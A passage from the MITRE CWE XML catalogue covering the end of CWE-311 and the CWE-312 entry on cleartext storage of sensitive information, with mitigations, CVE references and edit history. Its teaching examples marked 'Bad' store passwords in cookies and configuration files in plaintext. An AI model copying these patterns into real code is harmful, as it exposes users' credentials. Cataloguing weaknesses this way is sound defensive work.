            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="157"/>
            <Related_Attack_Pattern CAPEC_ID="158"/>
            <Related_Attack_Pattern CAPEC_ID="204"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="37"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="384"/>
            <Related_Attack_Pattern CAPEC_ID="385"/>
            <Related_Attack_Pattern CAPEC_ID="386"/>
            <Related_Attack_Pattern CAPEC_ID="387"/>
            <Related_Attack_Pattern CAPEC_ID="388"/>
            <Related_Attack_Pattern CAPEC_ID="477"/>
            <Related_Attack_Pattern CAPEC_ID="609"/>
            <Related_Attack_Pattern CAPEC_ID="65"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 17: Failure to Protect Stored Data.&#34; Page 253"/>
            <Reference External_Reference_ID="REF-265"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Encryption&#34;, Page 43"/>
            <Reference External_Reference_ID="REF-267"/>
         </References>
         <Notes>
            <Note Type="Relationship">There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Failure to Encrypt Data</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-02-16">Failure to Encrypt Sensitive Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="312" Name="Cleartext Storage of Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.</Description>
         <Extended_Description>
	 <xhtml:p>Because the information is stored in cleartext (i.e., unencrypted), attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.</xhtml:p>
	 <xhtml:p>When organizations adopt cloud services, it can be easier for attackers to access the data from anywhere on the Internet.</xhtml:p>
	 <xhtml:p>In some systems/environments such as cloud, the use of "double encryption" (at both the software and hardware layer) might be required, and the developer might be solely responsible for both layers, instead of shared responsibility with the administrator of the broader system/environment.</xhtml:p>
       </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="922" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
	    <Technology Class="ICS/OT" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker with access to the system could read sensitive information stored in cleartext.</Note>
            </Consequence>
         </Common_Consequences>
	 <Potential_Mitigations>
	   <Mitigation>
	     <Phase>Implementation</Phase>
	     <Phase>System Configuration</Phase>
	     <Phase>Operation</Phase>
	     <Description>When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to encrypt the data at rest. [REF-1297] [REF-1299] [REF-1301]</Description>
	   </Mitigation>
	 </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-44">
               <Intro_Text>The following code excerpt stores a plaintext user account ID in a browser cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>response.addCookie( new Cookie("userAccountID", acctID);</xhtml:div>
               </Example_Code>
               <Body_Text>Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-40">
               <Intro_Text>This code writes a user's login information to a cookie so the user does not have to login again later.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function persistLogin($username, $password){<xhtml:div style="margin-left:1em;">$data = array("username" =&gt; $username, "password"=&gt; $password);<xhtml:br/>setcookie ("userdata", $data);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.</Body_Text>
               <Body_Text>Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-41">
               <Intro_Text>The following code attempts to establish a connection, read in a password, then store it to a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>server.sin_family = AF_INET; hp = gethostbyname(argv[1]);<xhtml:br/>if (hp==NULL) error("Unknown host");<xhtml:br/>memcpy( (char *)&amp;server.sin_addr,(char *)hp-&gt;h_addr,hp-&gt;h_length);<xhtml:br/>if (argc &lt; 3) port = 80;<xhtml:br/>else port = (unsigned short)atoi(argv[3]);<xhtml:br/>server.sin_port = htons(port);<xhtml:br/>if (connect(sock, (struct sockaddr *)&amp;server, sizeof server) &lt; 0) error("Connecting");<xhtml:br/>...<xhtml:br/>while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>write(dfd,password_buffer,n);<xhtml:br/>...<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	            <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	            <Body_Text>At least one OT product stored a password in plaintext.</Body_Text>
	         </Demonstrative_Example>
		 <Demonstrative_Example Demonstrative_Example_ID="DX-155">
		   <Intro_Text>In 2021, a web site operated by PeopleGIS stored data of US municipalities in Amazon Web Service (AWS) Simple Storage Service (S3) buckets.</Intro_Text>
		   <Example_Code Nature="Bad" Language="Other">
                     <xhtml:div>A security researcher found 86 S3 buckets that could be accessed without authentication (CWE-306) and stored data unencrypted (CWE-312). These buckets exposed over 1000 GB of data and 1.6 million files including physical addresses, phone numbers, tax documents, pictures of driver's license IDs, etc. [REF-1296] [REF-1295]</xhtml:div>
		   </Example_Code>
		   <Body_Text>While it was not publicly disclosed how the data was protected after discovery, multiple options could have been considered.</Body_Text>
		   <Example_Code Nature="Good" Language="Other">
                     <xhtml:div>The sensitive information could have been protected by ensuring that the buckets did not have public read access, e.g., by enabling the s3-account-level-public-access-blocks-periodic rule to Block Public Access. In addition, the data could have been encrypted at rest using the appropriate S3 settings, e.g., by enabling server-side encryption using the s3-bucket-server-side-encryption-enabled setting. Other settings are available to further prevent bucket data from being leaked. [REF-1297]</xhtml:div>
		   </Example_Code>
		 </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Consider the following PowerShell command examples for encryption scopes of Azure storage objects. In the first example, an encryption scope is set for the storage account.</Intro_Text>
               <Example_Code Nature="bad" Language="Shell">
                  <xhtml:div>New-AzStorageEncryptionScope -ResourceGroupName "MyResourceGroup" -AccountName "MyStorageAccount" -EncryptionScopeName testscope -StorageEncryption</xhtml:div>
               </Example_Code>
	       <Body_Text>The result (edited and formatted for readability) might be:</Body_Text>
	       <Example_Code Nature="bad" Language="Other">
		 <xhtml:div>ResourceGroupName: MyResourceGroup, StorageAccountName: MyStorageAccount</xhtml:div>
		 <xhtml:p/>
		 <xhtml:div>
                   <xhtml:table>
                     <xhtml:tr>
                       <xhtml:th>Name</xhtml:th>
                       <xhtml:th>State</xhtml:th>
                       <xhtml:th>Source</xhtml:th>
                       <xhtml:th>RequireInfrastructureEncryption</xhtml:th>
                     </xhtml:tr>
                     <xhtml:tr>
                       <xhtml:td>testscope</xhtml:td>
                       <xhtml:td>Enabled</xhtml:td>
                       <xhtml:td>Microsoft.Storage</xhtml:td>
                       <xhtml:td/>
                     </xhtml:tr>
		   </xhtml:table>
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>However, the empty string under RequireInfrastructureEncryption indicates this service was not enabled at the time of creation, because the -RequireInfrastructureEncryption argument was not specified in the command.</Body_Text>
	       <Body_Text>Including the -RequireInfrastructureEncryption argument addresses the issue:</Body_Text>
               <Example_Code Nature="good" Language="Shell">
                  <xhtml:div>New-AzStorageEncryptionScope -ResourceGroupName "MyResourceGroup" -AccountName "MyStorageAccount" -EncryptionScopeName testscope -StorageEncryption -RequireInfrastructureEncryption</xhtml:div>
               </Example_Code>
	       <Body_Text>This produces the report:</Body_Text>
	       <Example_Code Nature="result" Language="Other">
		 <xhtml:div>ResourceGroupName: MyResourceGroup, StorageAccountName: MyStorageAccount</xhtml:div>
		 <xhtml:p/>
		 <xhtml:div>
                   <xhtml:table>
                     <xhtml:tr>
                       <xhtml:th>Name</xhtml:th>
                       <xhtml:th>State</xhtml:th>
                       <xhtml:th>Source</xhtml:th>
                       <xhtml:th>RequireInfrastructureEncryption</xhtml:th>
                     </xhtml:tr>
                     <xhtml:tr>
                       <xhtml:td>testscope</xhtml:td>
                       <xhtml:td>Enabled</xhtml:td>
                       <xhtml:td>Microsoft.Keyvault</xhtml:td>
                       <xhtml:td>True</xhtml:td>
                     </xhtml:tr>
		   </xhtml:table>
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>In a scenario where both software and hardware layer encryption is required ("double encryption"), Azure's infrastructure encryption setting can be enabled via the CLI or Portal. An important note is that infrastructure hardware encryption cannot be enabled or disabled after a blob is created. Furthermore, the default value for infrastructure encryption is disabled in blob creations.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-30275</Reference>
               <Description>Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30275</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2272</Reference>
               <Description>password and username stored in cleartext in a cookie</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1466</Reference>
               <Description>password stored in cleartext in a file with insecure permissions</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1466</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0152</Reference>
               <Description>chat program disables SSL in some circumstances even when the user says to use SSL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0152</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1603</Reference>
               <Description>Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0964</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6157</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6828</Reference>
               <Description>product stores a password in cleartext in memory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1567</Reference>
               <Description>storage of a secret key in cleartext in a temporary file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1567</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0174</Reference>
               <Description>SCADA product uses HTTP Basic Authentication, which is not encrypted</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5778</Reference>
               <Description>login credentials stored unencrypted in a registry key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5778</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1481</Reference>
               <Description>Plaintext credentials in world-readable file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1481</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1828</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2209</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2209</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1696</Reference>
               <Description>Decrypted copy of a message written to disk given a combination of options and when user replies to an encrypted message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1696</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2397</Reference>
               <Description>Plaintext storage of private key and passphrase in log file when user imports the key.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2397</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1800</Reference>
               <Description>Admin password in plaintext in a cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1800</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1537</Reference>
               <Description>Default configuration has cleartext usernames/passwords in cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1537</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1536</Reference>
               <Description>Usernames/passwords in cleartext in cookies.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1536</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2160</Reference>
               <Description>Authentication information stored in cleartext in a cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2160</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Storage of Sensitive Information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="37"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Encryption&#34;, Page 43"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-1283"/>
            <Reference External_Reference_ID="REF-1295"/>
            <Reference External_Reference_ID="REF-1296"/>
            <Reference External_Reference_ID="REF-1297"/>
            <Reference External_Reference_ID="REF-1299"/>
            <Reference External_Reference_ID="REF-1301"/>
            <Reference External_Reference_ID="REF-1307" Section="Section 3.2"/>
            <Reference External_Reference_ID="REF-1310"/>
         </References>
         <Notes>
            <Note Type="Terminology">Different people use "cleartext" and "plaintext" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-01-23</Modification_Date>
               <Modification_Comment>updated Abstraction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
